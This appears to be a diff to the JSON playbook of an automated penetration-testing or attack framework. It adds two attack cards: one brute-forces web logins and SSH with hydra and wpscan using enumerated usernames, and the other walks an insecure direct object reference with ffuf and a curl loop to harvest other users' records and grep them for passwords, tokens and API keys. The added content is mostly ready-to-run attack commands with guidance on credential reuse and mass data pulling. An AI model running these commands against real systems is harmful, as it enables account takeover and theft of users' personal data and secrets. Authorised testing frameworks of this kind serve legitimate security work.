@@ -405,7 +405,8 @@
       "os": [],
       "requires_all": [],
       "requires_any": [
-        "http.reachable"
+        "http.reachable",
+        "http.exposed"
       ],
       "produces": [
         "credential.candidate",
@@ -1202,6 +1203,91 @@
         }
       ],
       "autonomy": "manual"
+    },
+    {
+      "id": "web-login-brute",
+      "title": "Brute the Login with the Enumerated Users",
+      "hypothesis": "A real username list changes a login form from a guessing game into a targeted attack. Point hydra (or wpscan for WordPress) at the exact users you enumerated with a sensible wordlist; one reused or weak password is a validated credential you can take to the app, to SSH, and across the estate. Scope it: a couple of passwords against many users beats hammering one account into a lockout.",
+      "tool": "hydra",
+      "tools": [
+        "hydra",
+        "wpscan",
+        "ffuf"
+      ],
+      "requires_all": [
+        "web.users"
+      ],
+      "produces": [
+        "credential.available"
+      ],
+      "priority": 50,
+      "autonomy": "approve",
+      "proves": "a working application credential for one of the enumerated users",
+      "does_not_prove": "where else it is valid, confirm reuse with the credential-reuse and login cards",
+      "report": {
+        "finding": "Weak Application Credentials",
+        "severity": "high"
+      },
+      "refs": [
+        "https://github.com/vanhauser-thc/thc-hydra"
+      ],
+      "commands": [
+        {
+          "tool": "hydra",
+          "run": "hydra -L {{userlist}} -P {{wordlist}} {{target}} http-post-form \"{{form_path}}:{{form_body}}:{{fail_string}}\"",
+          "note": "The workhorse. {{form_body}} carries ^USER^/^PASS^ markers and {{fail_string}} is text that appears ONLY on a failed login. A [80][http-post-form] ... login: ... password: ... line is a hit."
+        },
+        {
+          "tool": "wpscan",
+          "run": "wpscan --url {{url}} -U {{userlist}} -P {{wordlist}}",
+          "note": "For WordPress: wpscan already enumerated the users (web.users); feed them straight back for the password attack against wp-login."
+        },
+        {
+          "tool": "hydra",
+          "run": "hydra -L {{userlist}} -P {{wordlist}} ssh://{{target}}",
+          "note": "Always try the enumerated app users against SSH too — web and shell passwords are reused constantly, and an SSH hit is a direct foothold."
+        }
+      ]
+    },
+    {
+      "id": "idor-harvest",
+      "title": "Harvest Data Through the IDOR",
+      "hypothesis": "A confirmed IDOR is a key that fits every lock in the series. If /account?id=1001 is yours, walk the range and pull every other user's record: profiles leak names and emails for a spray list, and account/export/invoice endpoints leak API keys, reset tokens, and passwords outright. Automate the walk so one off-by-one becomes the whole user table.",
+      "tool": "ffuf",
+      "tools": [
+        "ffuf",
+        "curl"
+      ],
+      "requires_all": [
+        "web.idor_candidate"
+      ],
+      "produces": [
+        "credential.candidate",
+        "loot.files"
+      ],
+      "priority": 49,
+      "autonomy": "approve",
+      "proves": "other users' data reached by walking the insecure direct object reference",
+      "does_not_prove": "code execution, this is unauthorised data access; a secret found here is a candidate until you use it",
+      "report": {
+        "finding": "Insecure Direct Object Reference (Mass Data Exposure)",
+        "severity": "high"
+      },
+      "refs": [
+        "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"
+      ],
+      "commands": [
+        {
+          "tool": "ffuf",
+          "run": "ffuf -u {{url}}/account?id=FUZZ -w <(seq 1000 1100) -H \"Cookie: {{session}}\" -mc 200",
+          "note": "Walk the object range with your own session. Every 200 is another user's record; -fs/-fw out the \"not yours\" response size so only real hits show."
+        },
+        {
+          "tool": "curl",
+          "run": "for i in $(seq 1000 1100); do curl -s -b \"{{session}}\" {{url}}/api/export?id=$i; done",
+          "note": "Pull each record and grep the responses for password, token, api_key, secret — export/invoice/profile endpoints hand these over in full, feeding crack-identify and the spray list."
+        }
+      ]
     },
     {
       "id": "verb-tampering",
